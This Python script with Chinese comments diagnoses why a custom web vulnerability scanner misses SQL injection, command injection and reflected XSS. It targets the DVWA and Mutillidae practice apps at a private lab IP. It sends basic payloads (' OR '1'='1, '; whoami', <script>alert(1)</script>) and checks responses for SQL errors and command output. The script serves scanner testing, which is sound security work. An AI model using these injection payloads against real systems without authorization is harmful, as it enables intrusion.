"""诊断 SQLi/CMDi/XSS 漏检原因"""
import sys, asyncio, aiohttp
sys.path.insert(0, r"C:\Users\HZR\.qclaw\workspace-agent-b7ed571b\wvs-v18")
from wvs.vuln.scanner_v18 import VulnerabilityScanner

TARGET = "http://192.168.18.131"
scanner = VulnerabilityScanner({"timeout": 15, "delay": 0.2})

async def diagnose():
    async with aiohttp.ClientSession() as session:
        # --- 1. SQLi 诊断 ---
        print("=" * 60)
        print("[1] SQLi DIAGNOSIS - DVWA")
        print("=" * 60)

        url = "http://192.168.18.131/dvwa/vulnerabilities/sqli/"
        param = "id"

        # 先发正常请求看 baseline
        try:
            async with session.get(url, params={"id": "1"}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                baseline = await resp.text()
                print(f"Baseline status: {resp.status}, length: {len(baseline)}")
                # 找 SQL 结果在页面中的特征
                import re
                # DVWA SQLi 正常结果包含 First name, Surname
                if "First name" in baseline or "Surname" in baseline:
                    print("  -> Contains 'First name'/'Surname' (DVWA SQLi page confirmed)")
                else:
                    print(f"  -> Content preview: {baseline[:500]}")
        except Exception as e:
            print(f"  -> Error: {e}")
            baseline = ""

        # 发 SQLi payload
        payload = "' OR '1'='1"
        try:
            async with session.get(url, params={"id": payload}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                print(f"\nSQLi payload status: {resp.status}, length: {len(content)}")

                # 检查是否有差异
                if len(content) != len(baseline):
                    print(f"  -> Length diff: {abs(len(content) - len(baseline))} chars")

                # 检查 SQL 错误签名
                from wvs.vuln.scanner_v18 import SQL_ERRORS
                for err in SQL_ERRORS[:5]:
                    if err in content:
                        print(f"  -> SQL ERROR matched: {err}")

                # 检查是否返回更多结果（OR 1=1 应该返回所有行）
                if len(content) > len(baseline) + 100:
                    print(f"  -> Content significantly larger (possible successful injection)")
                print(f"  -> Content preview: {content[:300]}")
        except Exception as e:
            print(f"  -> Error: {e}")

        # 手动调用 test_sqli 看内部逻辑
        print("\n  Calling test_sqli()...")
        try:
            vulns = await scanner.test_sqli(session, url, param, "GET")
            print(f"  -> test_sqli returned: {len(vulns)} vulns")
            for v in vulns:
                print(f"     {v.type}: {v.payload[:60]} (conf={v.confidence:.0%})")
        except Exception as e:
            print(f"  -> test_sqli error: {e}")
            import traceback
            traceback.print_exc()

        # --- 2. CMDi 诊断 ---
        print("\n" + "=" * 60)
        print("[2] CMDi DIAGNOSIS - Mutillidae")
        print("=" * 60)

        url2 = "http://192.168.18.131/mutillidae/index.php?page=dns-lookup.php"
        param2 = "dns_lookup_hostname"

        # Baseline
        try:
            async with session.get(url2, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                baseline2 = await resp.text()
                print(f"Baseline status: {resp.status}, length: {len(baseline2)}")
        except Exception as e:
            print(f"  -> Error: {e}")
            baseline2 = ""

        # CMDi payload
        payload2 = "; whoami"
        try:
            async with session.get(url2, params={param2: payload2}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content2 = await resp.text()
                print(f"\nCMDi payload status: {resp.status}, length: {len(content2)}")

                # 搜索命令输出
                import re
                for pattern in [r"uid=\d+", r"gid=\d+", r"www-data", r"daemon", r"root:", r"bin/bash"]:
                    match = re.search(pattern, content2)
                    if match:
                        print(f"  -> CMD OUTPUT matched: {match.group()}")

                # 搜索新内容
                new_content = content2[len(baseline2):] if len(content2) > len(baseline2) else ""
                if new_content.strip():
                    print(f"  -> New content (last 200 chars): ...{new_content[-200:]}")
                else:
                    # 在 content 中但不在 baseline 中的内容
                    for line in content2.split("\n"):
                        if line.strip() and line.strip() not in baseline2:
                            print(f"  -> Diff line: {line.strip()[:100]}")
                            break
        except Exception as e:
            print(f"  -> Error: {e}")

        print("\n  Calling test_cmdi()...")
        try:
            vulns2 = await scanner.test_cmdi(session, url2, param2)
            print(f"  -> test_cmdi returned: {len(vulns2)} vulns")
            for v in vulns2:
                print(f"     {v.type}: {v.payload[:60]} (conf={v.confidence:.0%})")
        except Exception as e:
            print(f"  -> test_cmdi error: {e}")
            import traceback
            traceback.print_exc()

        # --- 3. XSS 诊断 ---
        print("\n" + "=" * 60)
        print("[3] XSS DIAGNOSIS - DVWA")
        print("=" * 60)

        url3 = "http://192.168.18.131/dvwa/vulnerabilities/xss_r/"
        param3 = "name"

        payload3 = "<script>alert(1)</script>"
        try:
            async with session.get(url3, params={param3: payload3}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content3 = await resp.text()
                print(f"XSS payload status: {resp.status}, length: {len(content3)}")

                # 检查 payload 是否反射
                if payload3 in content3:
                    print(f"  -> Payload REFLECTED VERBATIM (should be high conf)")
                elif "&lt;script&gt;" in content3:
                    print(f"  -> Payload HTML-encoded (safe filtering)")
                else:
                    print(f"  -> Payload NOT found in response")
                    # 搜索部分
                    if "alert" in content3:
                        print(f"  -> 'alert' found in content")
                    if "script" in content3.lower():
                        print(f"  -> 'script' found in content")

                print(f"  -> Content preview: {content3[:500]}")
        except Exception as e:
            print(f"  -> Error: {e}")

        print("\n  Calling test_xss()...")
        try:
            vulns3 = await scanner.test_xss(session, url3, param3)
            print(f"  -> test_xss returned: {len(vulns3)} vulns")
            for v in vulns3:
                print(f"     {v.type}: {v.payload[:60]} (conf={v.confidence:.0%})")
        except Exception as e:
            print(f"  -> test_xss error: {e}")
            import traceback
            traceback.print_exc()

asyncio.run(diagnose())
